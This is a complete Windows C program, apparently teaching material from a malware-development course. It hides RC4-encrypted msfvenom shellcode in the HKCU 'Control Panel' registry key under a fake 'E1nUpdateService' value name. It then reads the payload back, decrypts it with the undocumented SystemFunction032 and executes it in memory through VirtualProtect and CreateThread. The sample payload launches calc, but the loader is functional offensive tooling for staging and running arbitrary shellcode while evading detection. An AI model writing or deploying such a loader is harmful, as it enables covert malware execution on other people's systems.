#include <Windows.h>
#include <stdio.h>

#pragma comment (lib, "Advapi32.lib") // Used to compile RegGetValueA

// Uncomment one of the following to enable the read/write mode 
//\
#define WRITEMODE
//
#define READMODE


// I/O registry key to read/write
#define     REGISTRY		"Control Panel"
#define     REGSTRING   "E1nUpdateService"


#ifdef READMODE

// Output from HellShell: `HellShell.exe calc.bin rc4`

typedef struct
{
    DWORD   Length;
    DWORD   MaximumLength;
    PVOID   Buffer;

} USTRING;

typedef NTSTATUS(NTAPI* fnSystemFunction032)(
    struct USTRING* Img,
    struct USTRING* Key
    );

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

    NTSTATUS        STATUS = NULL;

    USTRING         Key = { .Buffer = pRc4Key,              .Length = dwRc4KeySize,         .MaximumLength = dwRc4KeySize },
        Img = { .Buffer = pPayloadData,         .Length = sPayloadSize,         .MaximumLength = sPayloadSize };

    fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

    if ((STATUS = SystemFunction032(&Img, &Key)) != 0x0) {
        printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
        return FALSE;
    }

    return TRUE;
}


unsigned char Rc4Key[] = {
        0x8B, 0x9E, 0x3F, 0xC0, 0x3E, 0x31, 0xBF, 0xCF, 0xA5, 0x83, 0x7C, 0xC8, 0x6A, 0x61, 0x96, 0x9A };


// Function that reads the payload from the registry key 
BOOL ReadShellcodeFromRegistry(OUT PBYTE* ppPayload, OUT SIZE_T* psSize) {

    LSTATUS     STATUS = NULL;
    DWORD		dwBytesRead = NULL;
    PVOID		pBytes = NULL;

    // Fetching the payload's size
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    // Allocating heap that will store the payload that will be read
    pBytes = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesRead);
    if (pBytes == NULL) {
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    // Reading the payload from "REGISTRY" key, from value "REGSTRING"
    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, pBytes, &dwBytesRead);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        return FALSE;
    }

    // Saving 
    *ppPayload = pBytes;
    *psSize = dwBytesRead;

    return TRUE;
}


// Local shellcode execution - Review "Local Payload Execution - Shellcode" module
BOOL RunShellcode(IN PVOID pDecryptedShellcode, IN SIZE_T sDecryptedShellcodeSize) {

    PVOID pShellcodeAddress = NULL;
    DWORD dwOldProtection = NULL;

    pShellcodeAddress = VirtualAlloc(NULL, sDecryptedShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[i] Allocated Memory At : 0x%p \n", pShellcodeAddress);

    memcpy(pShellcodeAddress, pDecryptedShellcode, sDecryptedShellcodeSize);
    memset(pDecryptedShellcode, '\0', sDecryptedShellcodeSize);

    if (!VirtualProtect(pShellcodeAddress, sDecryptedShellcodeSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    printf("[#] Press <Enter> To Run ... ");
    getchar();

    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    return TRUE;
}

#endif // READMODE



#ifdef WRITEMODE

// Msfvenom x64 calc shellcode encrypted by HellShell [RC4]
unsigned char Rc4CipherText[] = {
        0x3F, 0x8C, 0x01, 0xCA, 0x70, 0x80, 0x3F, 0x6B, 0xE3, 0x7B, 0x77, 0xF2, 0x05, 0x77, 0x0E, 0x97,
        0x01, 0xD4, 0x45, 0x48, 0x65, 0xAA, 0x64, 0xD1, 0x04, 0xA1, 0xEB, 0xDF, 0x6E, 0x3C, 0x86, 0xDF,
        0x53, 0x89, 0xD4, 0x33, 0x87, 0x09, 0x9D, 0xF5, 0xB0, 0x25, 0xA3, 0xB0, 0xFA, 0x47, 0xA1, 0x8B,
        0x54, 0x36, 0x5D, 0x2A, 0x12, 0x6D, 0x9D, 0xCC, 0x37, 0x1B, 0x44, 0x4D, 0x1C, 0xD2, 0x0B, 0x26,
        0x41, 0xC8, 0x55, 0x14, 0xBD, 0x0A, 0xEF, 0x93, 0x3A, 0x4B, 0xA2, 0x3D, 0xF9, 0x67, 0x6E, 0xB4,
        0x68, 0x66, 0x44, 0xE2, 0x5D, 0xC9, 0xE6, 0xF7, 0xE9, 0x99, 0x68, 0x5E, 0x5E, 0xB0, 0x5E, 0xDE,
        0xB6, 0xF6, 0x66, 0x85, 0xF5, 0xEA, 0xA1, 0xB4, 0x4C, 0xF9, 0x70, 0xF4, 0xA2, 0x65, 0x33, 0xBD,
        0x5F, 0xD6, 0x55, 0x1A, 0x96, 0x51, 0x59, 0xE7, 0x13, 0x04, 0x10, 0x27, 0x46, 0x41, 0xBB, 0x1A,
        0xBC, 0x31, 0x46, 0x6E, 0x74, 0x72, 0x6D, 0x3F, 0xFE, 0x46, 0x1D, 0x55, 0x84, 0xA6, 0x24, 0x04,
        0x3B, 0xE1, 0x16, 0x21, 0x1F, 0xFA, 0xA4, 0x4E, 0x34, 0x91, 0x02, 0x55, 0x2B, 0xE1, 0xAD, 0xD3,
        0x7B, 0x52, 0xE8, 0xF3, 0xBF, 0x25, 0x17, 0xD9, 0x1B, 0xB7, 0x75, 0x01, 0x35, 0xF2, 0x5C, 0x94,
        0xA6, 0xCF, 0x92, 0xA1, 0x09, 0x23, 0x9C, 0x66, 0x73, 0x5E, 0x1A, 0xC5, 0xBD, 0xE2, 0x78, 0x60,
        0x9F, 0xC9, 0xF5, 0xFD, 0xE4, 0xD3, 0x02, 0x8F, 0x10, 0x11, 0x62, 0xFD, 0x0E, 0x80, 0xD3, 0x2E,
        0x87, 0x73, 0xB1, 0x9A, 0x75, 0xA6, 0x49, 0x1C, 0x8E, 0x2F, 0x6C, 0x28, 0xB6, 0xB8, 0x09, 0x18,
        0x71, 0x73, 0x7D, 0x97, 0x97, 0x67, 0xEF, 0xA5, 0x8D, 0x07, 0xD6, 0xDB, 0x43, 0x1F, 0x03, 0x31,
        0x6E, 0x91, 0x87, 0x9A, 0xDC, 0x12, 0xE7, 0x3C, 0xBA, 0x94, 0x79, 0xA7, 0x19, 0xAF, 0xBB, 0xE5,
        0x0B, 0x0F, 0xF5, 0xB9, 0x41, 0xD4, 0x4C, 0x8B, 0x63, 0xAF, 0xEE, 0xC8, 0xAF, 0x7C, 0xC9, 0xBE };


// Function that writes the payload pShellcode to the registry key
BOOL WriteShellcodeToRegistry(IN PBYTE pShellcode, IN DWORD dwShellcodeSize) {

    BOOL        bSTATE = TRUE;
    LSTATUS     STATUS = NULL;
    HKEY        hKey = NULL;

    printf("[i] Writing 0x%p [ Size: %ld ] to \"%s\\%s\" ... ", pShellcode, dwShellcodeSize, REGISTRY, REGSTRING);

    // Opening handle to "REGISTRY" registry key
    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegOpenKeyExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    // Creating string value "REGSTRING" and writing the payload to it as a binary value
    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode, dwShellcodeSize);
    if (ERROR_SUCCESS != STATUS) {
        printf("[!] RegSetValueExA Failed With Error : %d\n", STATUS);
        bSTATE = FALSE; goto _EndOfFunction;
    }

    printf("[+] DONE ! \n");


_EndOfFunction:
    if (hKey)
        RegCloseKey(hKey);
    return bSTATE;
}

#endif // WRITEMODE





int main() {


#ifdef WRITEMODE

    // Write the shellcode to the registry
    printf("[#] Press <Enter> To Write The Shellcode To The Registry...");
    getchar();
    if (!WriteShellcodeToRegistry(Rc4CipherText, sizeof(Rc4CipherText))) {
        return -1;
    }

    // goto _EndOfFunction;

#endif // WRITEMODE


#ifdef READMODE

    PVOID		pBytes = NULL;
    SIZE_T      sSize = NULL;

    printf("[#] Press <Enter> To Read The Shellcode From The Registry...");
    getchar();

    // Read the shellcode
    printf("[i] Reading Shellcode ... ");
    if (!ReadShellcodeFromRegistry(&pBytes, &sSize)) {
        return -1;
    }
    printf("[+] DONE \n");
    printf("[+] Payload Of Size [%d] Read At : 0x%p \n", sSize, pBytes);

    // Decrypting the shellcode
    printf("[#] Press <Enter> To Decrypt The Shellcode ...");
    getchar();
    printf("[i] Decrypting Shellcode ... ");
    if (!Rc4EncryptionViSystemFunc032(Rc4Key, pBytes, sizeof(Rc4Key), sSize)) {
        return -1;
    }
    printf("[+] DONE \n");

    // Running the shellcode
    if (!RunShellcode(pBytes, sSize)) {
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pBytes);

#endif // READMODE


_EndOfFunction:

    printf("[#] Press <Enter> To Quit ...");
    getchar();
    return 0;

}


